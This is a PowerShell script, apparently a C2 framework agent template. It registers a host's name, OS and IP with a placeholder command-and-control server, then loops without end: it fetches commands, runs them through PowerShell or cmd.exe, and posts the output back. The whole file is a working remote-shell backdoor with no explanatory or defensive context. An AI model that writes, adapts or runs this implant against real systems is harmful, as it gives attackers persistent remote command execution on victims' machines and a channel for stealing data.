$C2 = "http://{C2_HOST}:{C2_PORT}"

# Agent info
$hostname = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$ip = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPv4Address.IPAddressToString

# Register with C2
$body = @{
    hostname = $hostname
    os = $os
    ip = $ip
} | ConvertTo-Json
Invoke-RestMethod -Uri "$C2/register" -Method POST -Body $body -ContentType "application/json"

# Main persistent loop
while ($true) {
    try {
        $cmd = Invoke-RestMethod -Uri "$C2/command/$hostname"
        if ($cmd -ne "") {

            # Choose shell based on command
            if ($cmd -match "Get-|Invoke-|Select-|Format-|New-|Out-") {
                # Assume it's a PowerShell command
                $output = powershell.exe -Command $cmd | Out-String
            }
            else {
                # Run in CMD
                $output = cmd.exe /c $cmd | Out-String
            }

            $resultBody = @{ output = $output } | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2/result/$hostname" -Method POST -Body $resultBody -ContentType "application/json"
        }
        Start-Sleep -Seconds 3
    }
    catch {
        Start-Sleep -Seconds 3
    }
}
